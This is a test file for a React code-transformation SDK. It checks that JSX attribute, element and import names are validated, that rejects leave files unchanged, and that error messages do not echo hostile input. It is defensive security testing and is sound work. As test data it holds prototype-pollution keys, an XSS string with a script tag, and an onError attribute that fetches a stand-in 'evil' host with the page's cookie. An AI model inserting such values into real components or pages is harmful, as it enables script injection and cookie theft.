/**
 * S-001 — REQ-RXD-06 (per-arg validation battery, V4 denylist) + REQ-RXD-13.2 (validator
 * reject paths: zero-emit/byte-unchanged) + REQ-RXD-13.3 (bounded no-echo) + the Set-key-
 * safety static scan (ADR-02 clause) + a load-bearing raw-splice pin (spike leg b — proves
 * WHY the validator is load-bearing, independent of our own code).
 *
 * REQ-RXD-13.1 (canary sweep) lives in `test/security/canary-no-echo.test.ts`, reusing its
 * existing `surfaceContains` helper directly, per the slice's own task split.
 */
import { describe, it, expect } from "bun:test";
import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { SyntaxKind, type SourceFile } from "ts-morph";
import {
  assertValidAttributeName,
  assertValidElementName,
  assertValidImportBinding,
} from "../../../src/core/jsx-name-validator.ts";
import { parse, print } from "../../../src/dialects/react/ast.ts";
import * as react from "../../../src/dialects/react/index.ts";
import { defineFactory } from "../../../src/core/context.ts";
import { makeSpyClient, collectModifies } from "../../support/spy-client.ts";

// The battery every REQ-RXD-06.5 case runs — each value rejects as BOTH elementName and
// propName. The three denylist names are grammar-valid (they hit the Set, not the regex).
const HOSTILE_BATTERY: string[] = [
  "__proto__",
  "constructor",
  "prototype",
  "Foo bar",
  "Foo=1}",
  "a><script>alert(1)</script>",
  "",
  "   ",
  "foo\nbar",
  "123abc",
];

const DENYLISTED = new Set(["__proto__", "constructor", "prototype"]);

describe("REQ-RXD-06.5 — hostile battery rejects pre-mutation for BOTH name args", () => {
  for (const value of HOSTILE_BATTERY) {
    it(`propName ${JSON.stringify(value)} rejects, naming propName, never echoing the value`, () => {
      let caught: unknown;
      try {
        assertValidAttributeName(value);
      } catch (err) {
        caught = err;
      }
      expect(caught).toBeInstanceOf(Error);
      const message = (caught as Error).message;
      expect(message).toContain("propName");
      // The empty string trivially "is contained in" every string — the no-echo assertion
      // only means something for a non-empty hostile value.
      if (!DENYLISTED.has(value) && value.length > 0) {
        expect(message).not.toContain(value);
      }
    });

    it(`elementName ${JSON.stringify(value)} rejects, naming elementName, never echoing the value`, () => {
      let caught: unknown;
      try {
        assertValidElementName(value);
      } catch (err) {
        caught = err;
      }
      expect(caught).toBeInstanceOf(Error);
      const message = (caught as Error).message;
      expect(message).toContain("elementName");
      if (!DENYLISTED.has(value) && value.length > 0) {
        expect(message).not.toContain(value);
      }
    });
  }
});

describe("REQ-RXD-06 — grammar happy path (widened names admitted, not just the plain case)", () => {
  it("assertValidAttributeName admits hyphens and one :namespace segment", () => {
    expect(() => assertValidAttributeName("data-testid")).not.toThrow();
    expect(() => assertValidAttributeName("aria-label")).not.toThrow();
    expect(() => assertValidAttributeName("xlink:href")).not.toThrow();
    expect(() => assertValidAttributeName("onClick")).not.toThrow();
  });

  it("assertValidElementName admits member, hyphenated, and plain forms", () => {
    expect(() => assertValidElementName("Button")).not.toThrow();
    expect(() => assertValidElementName("Menu.Item")).not.toThrow();
    expect(() => assertValidElementName("my-web-component")).not.toThrow();
  });

  it("assertValidImportBinding admits a plain JS identifier, rejects a non-identifier and a denylisted name", () => {
    expect(() => assertValidImportBinding("readFileSync")).not.toThrow();

    let grammarReject: unknown;
    try {
      assertValidImportBinding("123abc");
    } catch (err) {
      grammarReject = err;
    }
    expect((grammarReject as Error).message).toContain("name");

    let denylistReject: unknown;
    try {
      assertValidImportBinding("__proto__");
    } catch (err) {
      denylistReject = err;
    }
    expect((denylistReject as Error).message).toContain("__proto__");
  });
});

describe("REQ-RXD-06.5 — denylist rejects via frozen-Set equality, MAY echo the fixed literal (bounded)", () => {
  it("the three denylist names each name the reserved-name rule and echo the fixed (short) literal", () => {
    for (const name of ["__proto__", "constructor", "prototype"]) {
      let caught: unknown;
      try {
        assertValidAttributeName(name);
      } catch (err) {
        caught = err;
      }
      const message = (caught as Error).message;
      expect(message).toContain(name);
      expect(message.toLowerCase()).toContain("reserved");
    }
  });
});

// REQ-RXD-06.7 (V5, SEC-1) — the regex `IMPORT_BINDING_GRAMMAR` alone admits any
// `IdentifierName`, including JS reserved words, but `import { name }` requires a valid
// `BindingIdentifier`. `IMPORT_RESERVED_WORDS` closes that gap: exact Set-membership, never a
// substring/prefix match, so `classroom`/`imported`/`defaultValue` — which merely CONTAIN a
// reserved word — stay accepted.
const RESERVED_WORD_BATTERY = ["default", "import", "class", "null", "this", "function", "let", "yield", "await"];
const RESERVED_WORD_LOOKALIKES = ["classroom", "imported", "defaultValue"];

describe("REQ-RXD-06.7 — addImport.name reserved-word battery rejected pre-mutation (SEC-1)", () => {
  for (const word of RESERVED_WORD_BATTERY) {
    it(`${JSON.stringify(word)} rejects, naming \`name\` and the reserved-word rule`, () => {
      let caught: unknown;
      try {
        assertValidImportBinding(word);
      } catch (err) {
        caught = err;
      }
      expect(caught).toBeInstanceOf(Error);
      const message = (caught as Error).message;
      expect(message).toContain("`name`");
      expect(message.toLowerCase()).toContain("reserved word");
    });
  }

  for (const lookalike of RESERVED_WORD_LOOKALIKES) {
    it(`${JSON.stringify(lookalike)} — merely CONTAINS a reserved word as a substring — is ACCEPTED`, () => {
      expect(() => assertValidImportBinding(lookalike)).not.toThrow();
    });
  }
});

// REQ-RXD-06.9 (V6, F-1) — `eval` and `arguments` are strict-mode-RESTRICTED
// `BindingIdentifier` names, a DIFFERENT grammar category from REQ-RXD-06.7's reserved words:
// both remain valid identifiers outside binding position, so a reserved-word set cannot contain
// them by construction. `addImport` always emits into an ES module (always strict), so both are
// unconditionally rejected here. Same exact-Set-membership discipline as REQ-RXD-06.7 — a name
// that merely CONTAINS one of these as a substring stays accepted.
const STRICT_MODE_RESTRICTED_BATTERY = ["eval", "arguments"];
const STRICT_MODE_RESTRICTED_LOOKALIKES = ["evaluate", "myEval", "argumentsList"];

describe("REQ-RXD-06.9 — addImport.name strict-mode-restricted identifiers rejected pre-mutation (F-1)", () => {
  for (const word of STRICT_MODE_RESTRICTED_BATTERY) {
    it(`${JSON.stringify(word)} rejects, naming \`name\` and the reserved-word rule`, () => {
      let caught: unknown;
      try {
        assertValidImportBinding(word);
      } catch (err) {
        caught = err;
      }
      expect(caught).toBeInstanceOf(Error);
      const message = (caught as Error).message;
      expect(message).toContain("`name`");
      expect(message.toLowerCase()).toContain("reserved word");
    });
  }

  for (const lookalike of STRICT_MODE_RESTRICTED_LOOKALIKES) {
    it(`${JSON.stringify(lookalike)} — merely CONTAINS a strict-mode-restricted name as a substring — is ACCEPTED`, () => {
      expect(() => assertValidImportBinding(lookalike)).not.toThrow();
    });
  }
});

describe("REQ-RXD-13.3 — a 100-char hostile propName never appears, nor does any fragment longer than 16 chars", () => {
  it("names propName and the grammar rule; the full value and every long fragment are absent", () => {
    const hostile = "x".repeat(100) + "!"; // trailing "!" makes the grammar reject
    let caught: unknown;
    try {
      assertValidAttributeName(hostile);
    } catch (err) {
      caught = err;
    }
    const message = (caught as Error).message;
    expect(message).toContain("propName");
    expect(message).not.toContain(hostile);
    for (let i = 0; i + 17 <= hostile.length; i++) {
      expect(message).not.toContain(hostile.slice(i, i + 17));
    }
  });
});

// The forbidden shape is bracket-indexed PROPERTY ACCESS keyed by a name argument —
// `record[name]`, `{[name]: …}`, `counts[tag]++` — where `[` sits immediately against an
// identifier/`)`/`]`/`{` (member access or a computed-key object literal). A single-element
// ARRAY LITERAL (`[name]`, e.g. `namedImports: [name]`) or an array-DESTRUCTURING pattern
// (`([name]) => {}`, `const [name] = args`) is textually identical to `record[name]` if you
// only look at the bracket's contents — S-002's `addImport` introduces exactly these two safe
// shapes (validators destructure the args tuple; `addImportDeclaration` takes a named-imports
// ARRAY). The preceding-character check is what tells them apart: a bracket opening a
// literal/destructuring pattern is preceded by whitespace, `(`, `,`, `=`, or line-start —
// never by a word character, `)`, `]`, or `{`.
const FORBIDDEN_NAME_KEY_ACCESS = /[\w$)\]{]\[\s*(?:propName|elementName|name|tag)\s*\]/;

describe("Set-key-safety static scan (ADR-02 clause) — propName/elementName are NEVER plain-object keys", () => {
  it("src/core/jsx-name-validator.ts and every file under src/dialects/react/** contain no bracket-indexed object access keyed by a name argument", () => {
    const root = new URL("../../../", import.meta.url).pathname;
    const files = [
      join(root, "src/core/jsx-name-validator.ts"),
      ...readdirSync(join(root, "src/dialects/react"))
        .filter((f) => f.endsWith(".ts"))
        .map((f) => join(root, "src/dialects/react", f)),
    ];
    expect(files.length).toBeGreaterThan(0);
    for (const file of files) {
      // Strip `//` line comments before scanning — this file's OWN prose (documenting the
      // forbidden pattern) legitimately contains the literal text `record[name]` etc.
      const code = readFileSync(file, "utf-8")
        .split("\n")
        .map((line) => line.replace(/\/\/.*/, ""))
        .join("\n");
      expect(FORBIDDEN_NAME_KEY_ACCESS.test(code)).toBe(false);
    }
  });

  it("the scan still catches the forbidden shapes it exists to guard against", () => {
    expect(FORBIDDEN_NAME_KEY_ACCESS.test("record[name]")).toBe(true);
    expect(FORBIDDEN_NAME_KEY_ACCESS.test("{[name]: value}")).toBe(true);
    expect(FORBIDDEN_NAME_KEY_ACCESS.test("counts[tag]++")).toBe(true);
  });

  it("the scan does NOT flag array-literal or destructuring shapes that merely contain the same bracket text", () => {
    expect(FORBIDDEN_NAME_KEY_ACCESS.test("namedImports: [name]")).toBe(false);
    expect(FORBIDDEN_NAME_KEY_ACCESS.test("([name]) => {}")).toBe(false);
    expect(FORBIDDEN_NAME_KEY_ACCESS.test("const [name] = args;")).toBe(false);
  });
});

describe("Load-bearing raw-splice pin (spike leg b) — WHY the validator is load-bearing, independent of our code", () => {
  it("ts-morph's structured addAttribute API writes an unvalidated hostile name as RAW, unescaped text", () => {
    // Bypasses setJsxProp/validatedOp entirely — calls ts-morph directly, the same way an
    // unvalidated op body would, to prove the underlying library performs zero escaping on
    // the attribute NAME. This is what makes src/core/jsx-name-validator.ts load-bearing.
    const ast: SourceFile = parse("const el = <Button />;\n");
    const element = ast.getDescendantsOfKind(SyntaxKind.JsxSelfClosingElement)[0]!;
    const hostileName = 'onError={fetch("//evil/"+cookie)}';
    element.addAttribute({ name: hostileName, initializer: "{x}" });
    const printed = print(ast);
    expect(printed).toContain(hostileName);
  });
});

describe("REQ-RXD-13.2 (setJsxProp reject paths) — zero directives, byte-unchanged file", () => {
  it("a validator (grammar) reject emits zero directives and leaves the file byte-unchanged", async () => {
    const before = "const el = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "Button.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", "Foo bar", "{1}");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toContain("propName");
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("Button.tsx")).toBe(before);
  });

  it("a zero-match reject emits zero directives and leaves the file byte-unchanged", async () => {
    const before = "const el = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "Button.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Missing", "x", "{1}");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("Button.tsx")).toBe(before);
  });

  it("a multi-match reject emits zero directives and leaves the file byte-unchanged", async () => {
    const before = "const a = <Button />;\nconst b = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "sample.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("sample.tsx").setJsxProp("Button", "onClick", "{f}");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("sample.tsx")).toBe(before);
  });
});

describe("REQ-RXD-13.2 (addImport + gate paths, S-002) — zero directives, byte-unchanged file", () => {
  it("an addImport validator (grammar) reject emits zero directives and leaves the file byte-unchanged", async () => {
    const before = "const el = <div />;\n";
    const { client, emitted } = makeSpyClient({ "App.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("App.tsx").addImport("123abc", "react");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    // Backtick-bounded, not a bare substring: `"propName"` legitimately CONTAINS the substring
    // "name" (QA-5) — the backtick-quoted form `` `name` `` cannot appear inside `` `propName` ``.
    expect((caught as Error).message).toContain("`name`");
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("App.tsx")).toBe(before);
  });

  it("the extension gate, triggered IN-RUN (inside the async run body, not a bare top-level call), emits zero directives and leaves the file byte-unchanged", async () => {
    const before = "const el = <div />;\n";
    const { client, emitted } = makeSpyClient({ "Component.ts": before });

    const run = defineFactory<void>(async () => {
      await react.find("Component.ts").addImport("useState", "react");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toContain("@pbuilder/sdk/typescript");
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("Component.ts")).toBe(before);
  });
});

// REQ-RXD-06.5's THEN clause is a handle-level property ("WHEN each op is applied THEN every
// case rejects pre-mutation — zero directives, byte-unchanged") — the bare-function battery
// above proves the grammar/denylist logic; this loop proves the WIRING, end-to-end through
// `react.find().setJsxProp()` AND `react.find().addImport()` (S-002: all 10 values are
// grammar-invalid or denylisted for IMPORT_BINDING_GRAMMAR too, so "where the grammar
// applies" scopes `addImport.name` to the full battery). Asserting the message names the
// ARGUMENT ("propName"/"elementName"/"name") is what distinguishes a validator-shaped reject
// from an accidental one: a hostile elementName would incidentally reject as a zero-match
// ("no element named ...") even if `assertValidElementName` were never wired, and a hostile
// unvalidated addImport name either splices raw (no error at all) or dies inside ts-morph as
// a contained foreign throw (`addImport() on "..." threw`) — neither message names the arg.
describe("REQ-RXD-06.5 — end-to-end: every hostile value rejects THROUGH the handle, zero directives, byte-unchanged", () => {
  const SEED = "const el = <Button />;\n";

  type HostileArg = "propName" | "elementName" | "name";

  async function runRejecting(argName: HostileArg, hostile: string) {
    const { client, emitted } = makeSpyClient({ "Button.tsx": SEED });
    const run = defineFactory<void>(async () => {
      if (argName === "propName") {
        await react.find("Button.tsx").setJsxProp("Button", hostile, "{1}");
      } else if (argName === "elementName") {
        await react.find("Button.tsx").setJsxProp(hostile, "x", "{1}");
      } else {
        await react.find("Button.tsx").addImport(hostile, "react");
      }
    });
    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    return { caught, emitted, client };
  }

  const ARG_OP: Record<HostileArg, string> = {
    propName: "setJsxProp",
    elementName: "setJsxProp",
    name: "addImport",
  };

  for (const argName of ["propName", "elementName", "name"] as const) {
    for (const hostile of HOSTILE_BATTERY) {
      it(`${ARG_OP[argName]}.${argName} ${JSON.stringify(hostile)}: validator-shaped reject, zero directives, file byte-unchanged`, async () => {
        const { caught, emitted, client } = await runRejecting(argName, hostile);

        expect(caught).toBeInstanceOf(Error);
        const message = (caught as Error).message;
        // Backtick-bounded (QA-5 fix): every react reject tail names its argument as
        // `` `${argName}` `` (nameRuleTail/denylist/reserved-word all share this shape) — a
        // bare `.toContain(argName)` is a substring test that "propName" trivially satisfies
        // for `argName === "name"`, so pointing `addImport` at the WRONG validator
        // (`assertValidAttributeName` instead of `assertValidImportBinding`) still produced a
        // `propName`-shaped message that passed this assertion. The backtick-quoted form
        // cannot: `` `name` `` is not a substring of `` `propName` ``.
        expect(message).toContain(`\`${argName}\``);
        if (!DENYLISTED.has(hostile) && hostile.length > 0) {
          expect(message).not.toContain(hostile);
        }
        expect(collectModifies(emitted)).toHaveLength(0);
        expect(await client.read("Button.tsx")).toBe(SEED);
      });
    }
  }
});
